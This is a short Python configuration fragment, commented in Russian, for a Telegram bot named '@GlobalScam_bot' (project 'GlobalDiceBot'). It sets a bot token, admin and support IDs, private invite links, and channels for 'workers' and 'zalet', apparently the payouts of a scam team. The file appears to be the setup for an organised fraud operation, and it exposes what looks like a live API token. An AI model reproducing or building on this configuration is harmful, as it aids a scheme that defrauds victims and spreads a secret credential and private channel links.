...
bot = telebot.TeleBot('2114704398:AAEeZesRAMpGMpZDTmwayA9b5-uXlRIHC20') # Токен бота воркеров

admin = 2051473697 # ID Админа
support = 2051473697 # ID сапорта
channel_id = -1001745454765 # ID Канала залётов
chat_worker_id = -1001739561723 # ID Чата с воркерами

bot_name = '@GlobalScam_bot' # Username Бота

mater = '' # Ссылка на мануалы
zalet = 'https://t.me/joinchat/3KKz-nT3Xsc4ZjJi' # Ссылка на канал с залётами
infos = 'https://t.me/joinchat/nx3AamgzIGFkMTNi' # Ссылка на инфо канал
pname = 'GlobalDiceBot' # Название проекта
pdate = '19.11.2021' # Дата созданя проекта
